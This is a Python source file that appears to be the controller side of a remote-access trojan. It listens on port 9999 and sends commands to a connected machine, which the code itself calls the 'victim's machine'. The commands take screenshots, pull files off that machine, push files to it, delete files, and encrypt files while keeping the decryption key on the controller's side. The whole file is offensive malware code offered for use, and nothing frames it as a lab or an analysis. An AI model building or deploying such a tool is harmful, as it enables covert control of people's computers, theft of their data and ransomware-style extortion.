#view_cwd : command to get current working directory
#download_file : command to dwnld file


import os
import socket
import psutil

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 9999
s.bind((host, port))

print("Server is currently running @", host)
print("Waiting for connection...")
s.listen(10)
conn, addr = s.accept()
print("")
print(addr, " has connected to the server successfully!")

#command handling

while 1:
    command = input(str("Command >>"))
    if command == "screenshot":
        conn.send(command.encode())
        print("Command executed successfully!")

    elif command == "download_file":
        conn.send(command.encode())
        filepath = input(str("Please enter the file path: "))
        conn.send(filepath.encode())
        file = conn.recv(100000)
        filename = input(str("Please enter the file name to save the downloaded file as: "))
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print("File saved successfully")

    elif command == "send_file":
        conn.send(command.encode())
        filepath = input(str("Please enter the file path:"))
        filename = input(str("Please enter the name of the file to be sent: "))
        data = open(filepath, 'rb')
        file_data = data.read(50000)
        conn.send(filename.encode())
        print("Sending file...")
        conn.send(file_data)
        print("File sent successfully!")

    elif command == "remove_file":
        conn.send(command.encode())
        file = input(str("Enter the file path: "))
        conn.send(file.encode())
        print(file, " deleted successfully on victim's machine!")
        
        
    elif command == "encrypt_file":
        conn.send(command.encode())
        filename = input(str("Enter the name of the file you want to encrypt: "))
        conn.send(filename.encode())
        print("File encrypted successfully")
        file = conn.recv(5000)
        new_file = open('key.key', "wb")
        new_file.write(file)
        new_file.close()
        print("The key for decryption has been downloaded successfully")
        
    elif command == "decrypt_file":
        conn.send(command.encode())
        filename = input(str("Enter the name of the file you want to decrypt: "))
        conn.send(filename.encode())
        data = open('key.key', 'rb')
        file_data = data.read(5000)
        conn.send(file_data)
        
        print("File decrypted successfully")
        
    else:
        print("Command not recognized")
    
